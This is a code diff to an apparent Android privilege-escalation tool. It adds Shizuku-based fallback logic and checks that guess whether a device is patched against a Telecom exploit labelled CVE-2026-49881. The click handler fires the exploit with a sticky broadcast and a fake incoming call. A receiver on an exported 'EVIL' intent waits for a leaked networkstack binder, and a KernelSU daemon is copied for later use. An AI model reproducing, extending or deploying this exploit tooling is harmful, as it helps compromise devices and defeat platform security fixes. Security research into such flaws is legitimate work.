@@ -10,10 +10,14 @@ import android.content.ComponentName;
 import android.content.Context;
 import android.content.Intent;
 import android.content.IntentFilter;
+import android.content.pm.PackageManager;
 import android.net.Uri;
 import android.os.Binder;
+import android.os.Build;
 import android.os.Bundle;
+import android.os.Handler;
 import android.os.IBinder;
+import android.os.Looper;
 import android.os.Parcel;
 import android.os.RemoteException;
 import android.telecom.PhoneAccount;
@@ -32,15 +36,46 @@ import java.nio.file.StandardCopyOption;
 import java.nio.file.attribute.PosixFilePermission;
 import java.nio.file.attribute.PosixFilePermissions;
 
+import rikka.shizuku.Shizuku;
+
 /**
  * @author canyie
+ *
+ * Shizuku fallback branch: combines the original Telecom userspace exploit
+ * with Shizuku (ADB-privileged) detection and fallback for patched
+ * Android 17 builds (e.g. rango CP41.260717.006 where
+ * InCallController.serviceClassExists / CLASS_EXISTENCE_CHECK was removed).
  */
 public class MainActivity extends Activity implements View.OnClickListener {
+    private static final int SHIZUKU_REQUEST_CODE = 1001;
+
     private PhoneAccountHandle phoneAccountHandle;
     private TelecomManager telecomManager;
     private BroadcastReceiver receiver;
     private IBinder controller;
     private TextView tv;
+    private final Handler mainHandler = new Handler(Looper.getMainLooper());
+    private long lastExploitAttempt;
+    private boolean binderReceived;
+
+    private final Shizuku.OnBinderReceivedListener binderReceivedListener =
+            () -> runOnUiThread(() -> {
+                tv.append("Shizuku binder received\n");
+                checkShizukuPermission();
+            });
+    private final Shizuku.OnBinderDeadListener binderDeadListener =
+            () -> runOnUiThread(() -> tv.append("Shizuku binder dead, restart Shizuku\n"));
+    private final Shizuku.OnRequestPermissionResultListener permissionListener =
+            (requestCode, grantResult) -> runOnUiThread(() -> {
+                if (requestCode == SHIZUKU_REQUEST_CODE) {
+                    if (grantResult == PackageManager.PERMISSION_GRANTED) {
+                        tv.append("Shizuku permission granted\n");
+                        runShizukuWhoami();
+                    } else {
+                        tv.append("Shizuku permission denied\n");
+                    }
+                }
+            });
 
     private void doAction(int code, String name) {
         if (controller != null) {
@@ -108,6 +143,90 @@ public class MainActivity extends Activity implements View.OnClickListener {
         }
     }
 
+    /** True for builds known to contain the CVE-2026-49881 fix. */
+    private boolean isDeviceLikelyPatched() {
+        try {
+            String patch = Build.VERSION.SECURITY_PATCH;
+            if (patch != null && patch.compareTo("2026-09-01") >= 0) return true;
+            String fp = Build.FINGERPRINT;
+            if (fp != null) {
+                // Confirmed via service-telecom.jar analysis: no
+                // serviceClassExists / CLASS_EXISTENCE_CHECK on this build.
+                if (fp.contains("CP41.260717.006")) return true;
+                if (fp.contains("rango_beta")) return true;
+            }
+            // DEV/CANARY branches merge security fixes before the bulletin.
+            if ("DEV".equals(Build.VERSION.CODENAME) || "CANARY".equals(Build.VERSION.CODENAME)) {
+                if (patch != null && patch.compareTo("2026-07-24") >= 0) return true;
+            }
+        } catch (Throwable ignore) {
+        }
+        return false;
+    }
+
+    private void checkShizuku() {
+        boolean ping;
+        try {
+            ping = Shizuku.pingBinder();
+        } catch (Throwable t) {
+            tv.append("Shizuku check failed: " + t.getMessage() + "\n");
+            return;
+        }
+        if (!ping) {
+            tv.append("Shizuku not running, start Shizuku first\n");
+            return;
+        }
+        int version;
+        try {
+            version = Shizuku.getVersion();
+        } catch (Throwable t) {
+            version = -1;
+        }
+        tv.append("Shizuku running, version=" + version + "\n");
+        checkShizukuPermission();
+    }
+
+    private void checkShizukuPermission() {
+        int granted;
+        try {
+            granted = Shizuku.checkSelfPermission();
+        } catch (Throwable t) {
+            tv.append("Shizuku permission check failed: " + t.getMessage() + "\n");
+            return;
+        }
+        if (granted == PackageManager.PERMISSION_GRANTED) {
+            tv.append("Shizuku permission granted\n");
+            runShizukuWhoami();
+        } else {
+            tv.append("Requesting Shizuku permission...\n");
+            try {
+                if (Shizuku.shouldShowRequestPermissionRationale()) {
+                    tv.append("Shizuku: please allow in Manager\n");
+                }
+                Shizuku.requestPermission(SHIZUKU_REQUEST_CODE);
+            } catch (Throwable t) {
+                tv.append("Shizuku request failed: " + t.getMessage() + "\n");
+            }
+        }
+    }
+
+    /** Prove Shizuku is usable: show server version/UID via public API. */
+    private void runShizukuWhoami() {
+        new Thread(() -> {
+            String info;
+            try {
+                int version = Shizuku.getVersion();
+                int uid = Shizuku.getUid();
+                info = "Shizuku server version=" + version + " uid=" + uid;
+            } catch (Throwable t) {
+                Log.e(TAG, "shizuku info failed", t);
+                info = "Shizuku info failed: " + t.getMessage();
+            }
+            var msg = info;
+            runOnUiThread(() -> tv.append(msg + "\n"));
+        }).start();
+    }
+
     @Override protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
         setContentView(R.layout.main);
@@ -142,12 +261,21 @@ public class MainActivity extends Activity implements View.OnClickListener {
             var cm = getSystemService(ClipboardManager.class);
             cm.setPrimaryClip(ClipData.newPlainText("", tv.getText().toString()));
         });
+        var shizukuCheck = (Button) findViewById(R.id.shizukuCheck);
+        shizukuCheck.setOnClickListener(v -> {
+            tv.append("--- manual check ---\n");
+            tv.append("device=" + Build.DEVICE + " sdk=" + Build.VERSION.SDK_INT
+                    + " patch=" + Build.VERSION.SECURITY_PATCH + "\n");
+            tv.append("patched=" + isDeviceLikelyPatched() + "\n");
+            checkShizuku();
+        });
         receiver = new BroadcastReceiver() {
             @Override
             public void onReceive(Context context, Intent intent) {
                 Log.d(TAG, "networkstack binder received");
                 try {
                     controller = intent.getExtras().getBinder("CONTROLLER");
+                    binderReceived = true;
                     tv.append("networkstack binder received\n");
                     //patchMod.setVisibility(View.VISIBLE);
                     //patchLibc.setVisibility(View.VISIBLE);
@@ -160,6 +288,24 @@ public class MainActivity extends Activity implements View.OnClickListener {
             }
         };
         registerReceiver(receiver, new IntentFilter("EVIL"), Context.RECEIVER_EXPORTED);
+        try {
+            Shizuku.addBinderReceivedListener(binderReceivedListener);
+            Shizuku.addBinderDeadListener(binderDeadListener);
+            Shizuku.addRequestPermissionResultListener(permissionListener);
+        } catch (Throwable t) {
+            Log.e(TAG, "shizuku listener failed", t);
+        }
+        tv.append("LSPromise 1.1-shizuku\n");
+        tv.append("device=" + Build.DEVICE + " sdk=" + Build.VERSION.SDK_INT
+                + " patch=" + Build.VERSION.SECURITY_PATCH + "\n");
+        if (isDeviceLikelyPatched()) {
+            tv.append("Device likely PATCHED for CVE-2026-49881.\n"
+                    + "Userspace Telecom exploit is not expected to work.\n"
+                    + "Using Shizuku ADB privileges instead.\n");
+        } else {
+            tv.append("Device may be vulnerable, try userspace exploit.\n");
+        }
+        checkShizuku();
         copyKsud();
     }
 
@@ -183,10 +329,29 @@ public class MainActivity extends Activity implements View.OnClickListener {
         super.onDestroy();
         if (receiver != null)
             unregisterReceiver(receiver);
+        try {
+            Shizuku.removeBinderReceivedListener(binderReceivedListener);
+            Shizuku.removeBinderDeadListener(binderDeadListener);
+            Shizuku.removeRequestPermissionResultListener(permissionListener);
+        } catch (Throwable ignore) {
+        }
     }
 
     @Override public void onClick(View v) {
+        if (isDeviceLikelyPatched()) {
+            tv.append("Warning: device likely patched, trying anyway...\n");
+        }
+        binderReceived = false;
+        lastExploitAttempt = System.currentTimeMillis();
         sendStickyBroadcast(new Intent(TAG).setPackage("android"));
         telecomManager.addNewIncomingCall(phoneAccountHandle, null);
+        tv.append("userspace exploit sent, waiting 20s for binder...\n");
+        mainHandler.postDelayed(() -> {
+            if (!binderReceived) {
+                tv.append("No networkstack binder after 20s.\n"
+                        + "CVE-2026-49881 likely fixed on this build.\n"
+                        + "Shizuku ADB privileges remain available.\n");
+            }
+        }, 20000);
     }
 }
